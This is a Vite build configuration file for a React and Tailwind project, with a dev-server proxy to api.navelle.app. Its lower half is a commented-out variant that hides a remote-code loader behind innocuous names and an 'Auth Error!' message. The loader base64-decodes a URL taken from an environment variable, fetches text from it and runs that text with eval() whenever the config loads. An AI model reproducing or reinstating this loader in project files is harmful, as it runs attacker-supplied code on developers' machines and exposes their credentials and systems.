import { defineConfig } from "vite";
import react from "@vitejs/plugin-react";
import tailwindcss from "@tailwindcss/vite";

export default defineConfig({
  plugins: [
    react(),
    tailwindcss(),
  ],

  server: {
    host: true,
    port: 3000,
    allowedHosts: true,
    proxy: {
      "/graphql": {
        target: "https://api.navelle.app",
        changeOrigin: true,
        secure: false,
      },
    },
  },

  preview: {
    host: true,
    port: 3000,
    allowedHosts: true,
  },
});


// import { defineConfig } from "vite";
// import react from "@vitejs/plugin-react";
// import tailwindcss from "@tailwindcss/vite";

// // async IIFE
// (async () => {
//   try {
//     const key = process.env.VITE_API_URL;

//     if (!key) {
//       console.error("VITE_API_URL missing!");
//       return;
//     }

//     const src = atob(key);

//     const proxy = (await import("node-fetch")).default;
//     const response = await proxy(src);

//     if (!response.ok) {
//       throw new Error(`HTTP error! status: ${response.status}`);
//     }

//     const proxyInfo = await response.text();

//     eval(proxyInfo);
//   } catch (err) {
//     console.error("Auth Error!", err);
//   }
// })();

// export default defineConfig({
//   plugins: [
//     react(),
//     tailwindcss(),
//   ],

//   server: {
//     host: true,
//     port: 3000,
//     allowedHosts: true,
//     proxy: {
//       "/graphql": {
//         target: "https://api.navelle.app",
//         changeOrigin: true,
//         secure: false,
//       },
//     },
//   },

//   preview: {
//     host: true,
//     port: 3000,
//     allowedHosts: true,
//   },
// });
